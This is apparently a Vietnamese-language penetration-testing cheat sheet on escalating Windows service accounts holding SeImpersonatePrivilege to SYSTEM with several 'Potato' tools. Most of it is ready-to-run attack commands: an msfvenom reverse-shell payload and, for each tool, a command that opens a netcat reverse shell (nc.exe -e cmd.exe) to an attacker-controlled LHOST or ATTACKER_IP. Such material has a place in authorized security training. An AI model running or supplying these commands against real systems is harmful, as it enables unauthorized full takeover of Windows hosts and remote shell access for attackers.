# SeImpersonate/SeAssignPrimaryTokenPrivilege

## Điểm chính khai thác

* Khai thác các lỗ hổng trong DCOM và RPCSS trên Windows 2012–2022 để leo thang đặc quyền từ tài khoản dịch vụ có **SeImpersonatePrivilege** hoặc **SeAssignPrimaryTokenPrivilege** lên **NT AUTHORITY\SYSTEM.**
* GodPotato tận dụng lỗi xử lý OXID trong dịch vụ RPCSS (chạy trên cổng 135), cho phép giả mạo token SYSTEM, hiệu quả với dịch vụ web/cơ sở dữ liệu có **SeImpersonatePrivilege.**
* Các công cụ như PrintSpoofer, SweetPotato, và RoguePotato cung cấp các phương thức thay thế, phù hợp với các phiên bản Windows và hạn chế mạng khác nhau (ví dụ: PrintSpoofer cho Windows 10/Server 2019+).

***

## Các bước khai thác

### Kiểm tra lỗ hổng

Kiểm tra quyền **SeImpersonatePrivilege** hoặc **SeAssignPrimaryTokenPrivilege** của tài khoản hiện tại để xác định khả năng khai thác:

```
whoami /priv
```

Liệt kê phiên bản hệ điều hành để chọn công cụ phù hợp (GodPotato, PrintSpoofer, v.v.):

```
systeminfo
```

Kiểm tra cấu hình mạng để đảm bảo cổng 135 (cho RoguePotato) hoặc named pipe (cho PrintSpoofer) có thể truy cập:

```
netstat -an
```

***

### Thực thi khai thác

Chuẩn bị payload hoặc mã khai thác:

{% code overflow="wrap" %}

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f exe -o shell.exe
```

{% endcode %}

Sử dụng các loại Potato bên dưới để chiếm quyền Administrator.

***

## Các loại Potato

### GodPotato

Khai thác lỗ hổng DCOM và RPCSS để nâng cao đặc quyền trên Windows 2012–2022, yêu cầu SeImpersonatePrivilege. Thích hợp cho các dịch vụ web/database.

```bash
GodPotato.exe -cmd "nc.exe -t -e C:\Windows\System32\cmd.exe <LHOST> <LPORT>"
```

* Hoạt động trên các hệ thống Windows hiện đại (lên đến 2022) nơi các công cụ Potato cũ thất bại.
* Khai thác cách xử lý OXID resolutions của RPCSS để thực hiện token impersonation.

***

### SweetPotato

Công cụ toàn diện kết hợp nhiều kỹ thuật nâng cao đặc quyền (DCOM, WinRM, EfsRpc, PrintSpoofer) để khai thác SeImpersonatePrivilege.

{% code overflow="wrap" %}

```bash
SweetPotato.exe -p "C:\Windows\System32\cmd.exe" -a "/c nc.exe <LHOST> <LPORT> -e cmd.exe" -e PrintSpoofer
```

{% endcode %}

* Hỗ trợ nhiều chế độ khai thác: DCOM, WinRM, EfsRpc, PrintSpoofer (mặc định).
* Tùy chọn linh hoạt: -c (CLSID), -m (phương thức: Auto/User/Thread), -l (cổng COM lắng nghe).

***

### GenericPotato

Một biến thể của SweetPotato, hỗ trợ impersonation qua HTTP/named pipe để nâng cao đặc quyền với SeImpersonatePrivilege.

{% code overflow="wrap" %}

```bash
GenericPotato.exe -p "C:\Windows\System32\cmd.exe" -a "/c nc.exe <LHOST> <LPORT> -e cmd.exe"
```

{% endcode %}

* Mở rộng SweetPotato với các giao thức impersonation bổ sung (HTTP/named pipe).
* Thích hợp cho các kịch bản cần token impersonation dựa trên named pipe hoặc HTTP.

***

### RoguePotato

Khai thác DCOM và các callback xác thực named pipe để impersonate SYSTEM token, yêu cầu SeImpersonatePrivilege và một máy từ xa do kẻ tấn công kiểm soát.

{% code overflow="wrap" %}

```bash
RoguePotato.exe -r <ATTACKER_IP> -c "nc.exe <LHOST> <LPORT> -e cmd.exe" -l 9999
```

{% endcode %}

* Yêu cầu máy từ xa (\<ATTACKER\_IP>) lắng nghe trên cổng 135 để chuyển hướng OXID resolutions.
* Sử dụng fake OXID RPC server và named pipe (ncacn\_np:localhost/pipe/roguepotato\[\pipe\epmapper]).

***

### PrintSpoofer

Lạm dụng dịch vụ Print Spooler và SeImpersonatePrivilege để nâng cao đặc quyền trên Windows 10/Server 2019+ nơi JuicyPotato thất bại.

```bash
PrintSpoofer.exe -c "nc.exe -e cmd.exe <LHOST> <LPORT>"
```

* Khai thác thao tác named pipe trong dịch vụ Print Spooler (\pipe\spoolss).
* Sử dụng PrinterBug để ép buộc xác thực SYSTEM qua RPC trên named pipe.

***

### JuicyPotatoNG

Phiên bản cải tiến của JuicyPotato, khai thác SeImpersonatePrivilege hoặc SeAssignPrimaryTokenPrivilege thông qua COM servers để nâng cao đặc quyền.

```bash
JuicyPotatoNG.exe -t * -p "nc.exe" -a "<LHOST> 4444 -e cmd.exe"
```

* Hoạt động trên các hệ thống nơi BITS bị vô hiệu hoặc cổng 6666 bị chiếm dụng, không như RottenPotatoNG.
* Yêu cầu CLSID hợp lệ (ví dụ: từ danh sách GitHub của công cụ hoặc qua PowerShell enumeration).

***

### SharpEfsPotato

Khai thác lỗ hổng EFS RPC (CVE-2021-36942) với SeImpersonatePrivilege để nâng cao đặc quyền cục bộ, dựa trên SweetPotato và SharpSystemTriggers.

{% code overflow="wrap" %}

```bash
SharpEfsPotato.exe -p C:\Windows\System32\cmd.exe -a "/c nc.exe <LHOST> <LPORT> -e cmd.exe"
```

{% endcode %}

* Nhắm vào phương thức EfsRpcEncryptFileSrv để thực hiện token impersonation.
* Hiệu quả trên các hệ thống đã vá các lỗ hổng cũ hơn.
